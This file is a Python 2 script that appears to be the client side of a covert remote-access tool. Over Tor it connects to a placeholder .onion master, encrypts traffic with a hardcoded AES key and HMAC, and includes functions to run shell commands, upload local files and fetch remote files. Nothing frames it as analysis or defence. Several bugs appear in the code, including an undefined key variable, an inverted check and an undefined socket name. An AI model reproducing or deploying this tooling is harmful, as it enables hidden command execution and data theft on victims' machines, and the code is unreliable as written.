#!/usr/bin/env python
import socket, sys, os, time, socks, hmac, hashlib, urllib2
from subprocess import check_output
from Crypto.Cipher import AES

class PKCS7Encoder():
    class InvalidBlockSizeError(Exception):
        """Raised for invalid block sizes"""
        pass

    def __init__(self, block_size=16):
        if block_size < 2 or block_size > 255:
            raise PKCS7Encoder.InvalidBlockSizeError('The block size must be ' \
                    'between 2 and 255, inclusive')
        self.block_size = block_size

    def encode(self, text):
        text_length = len(text)
        amount_to_pad = self.block_size - (text_length % self.block_size)
        if amount_to_pad == 0:
            amount_to_pad = self.block_size
        pad = chr(amount_to_pad)
        return text + pad * amount_to_pad

    def decode(self, text):
        pad = ord(text[-1])
        return text[:-pad]

encoder = PKCS7Encoder()

def Exec(cmd):
		out = check_output(cmd, shell=True)
		return out

def Upload(fileName):
		file_input = open(fileName, 'rb')
		SendTextCipher(fileName)
		while 1:
			bb = file_input.read(16)
			if bb == "": break
			SendTextCipher(bb)
		file_input.close()
		SendTextCipher("upload_client_close")

def Download():
		fileName = RecvTextCipher()
		file_input = open(fileName, 'wa')
		while 1:
			bb = RecvTextCipher()
			if bb == "upload_server_close": break
			file_input.write(bb)
			SendTextCipher(os.urandom(10))
		file_input.close()

def SendText(info):
		HM1 = hmac.new(Signkey, info, hashlib.sha256)
		info1 = info + HM1.digest() + zero
		sock.sendall(info1)

def SendTextCipher(info2):
		HM2 = hmac.new(SignKey, info2, hashlib.sha256)
		info1 = info2 + HM2.digest() + zero
		info = Encrypt(info1)
		sock.sendall(info)

def RecvTextCipher():
		l1 = sock.recv(4096)
		l = Decrypt(l1)
		data = ""
		while(l):
			data += l
			if data.endswith(zero) == True :
				break
			else :
				l = sock.recv(4096)
		endback = len(zero) + 32
		CheckString(data[:-len(zero)])
		return data[:-endback]

def RecvIV():
		l = sock.recv(4096)
		data = ""
		while(l):
			data += l
			if data.endswith(zero) == True :
				break
			else :
				l = sock.recv(4096)
		endback = len(zero) + 32
		CheckString(data[:-len(zero)])
		return data[:-endback]

def CheckString(check):
		HM3 = hmac.new(SignKey, check[:-32], hashlib.sha256)
		if hmac.compare_digest(HM3.digest(), check[-32:]) == True:
			pas = 1
		else:
			sys.exit(1)

def Encrypt(clearData):
		encryptor = cipher
		padded_data = encoder.encode(clearData)
		chiper_t = encryptor.encrypt(padded_data)
		return chiper_t
      
def Decrypt(cipherData):
		decryptor = cipher
		de_chiper_t = decryptor.decrypt(cipherData)
		unpadded_data = encoder.decode(de_chiper_t)
		return unpadded_data

def create_connection(address, timeout=None, source_address=None):
		sock = socks.socksocket()
		sock.connect(address)
		return sock

def URL(url):
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
	socket.socket = socks.socksocket
	socket.create_connection = create_connection
	file_name = url.split('/')[-1]
	u = urllib2.urlopen(url)
	f = open(file_name, 'wb')
	meta = u.info()
	file_size = int(meta.getheaders("Content-Length")[0])
	print "Downloading: %s Bytes: %s" % (file_name, file_size)
	file_size_dl = 0
	block_sz = 8192
	while True:
		buffer = u.read(block_sz)
		if not buffer:
			break
		file_size_dl += len(buffer)
		f.write(buffer)
		status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
		status = status + chr(8)*(len(status)+1)
		print status,
	f.close()
	print ""

def GenSignKey(key, salt, iterations):
		d_key = hashlib.pbkdf2_hmac('sha512', key, salt , iterations)
		return d_key

zero = "zero"
key = '\x86\x82\xb8\x9f\x9d[\xc6\x0c\xc6\x16bZ\x0c\x02I\x14W\xe4\x02mi\xee\x17\xea9\r\x96\xb6\x14\xfd\\\xfd'
salt = '\xd0\x1a\xa9\xa5\x94\xe4\xd0K\xca\xfb\xb6\x81\x05d\xa9d[N\xc8E\xfeN\x14\x98]=E\xe9%9F\xbd\x12(\xbb\x07\x1b\x1bOw'
iterations = 100000
SignKey = GenSignKey(key, salt, iterations)
#host = 'localhost'
name = 'client000-crypt'
port = 5555
size = 4096
sock = socks.socksocket()
sock.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1",9050)
host = "MasterAddressHere.onion"
sock.connect((host,port))
iv = RecvIV()
cipher = AES.new(key, AES.MODE_CBC, iv)

while 1:
	data1 = raw_input("[client]: ")
	if data1 == "terminate":
		SendTextCipher(name + " :: " + data1)
		sock.close()
		sys.exit()
	if data1.startswith("download"):
		SendTextCipher(name + " :: " + data1)
		dataUrl = RecvTextCipher()
		if dataUrl is not "no-file":
			print "Error! No File Found!"
		else:
			URL(dataUrl)
	else:
		SendTextCipher(name + " :: " + data1)
		data = RecvTextCipher()
		print "[recv]: " + data
s.close()
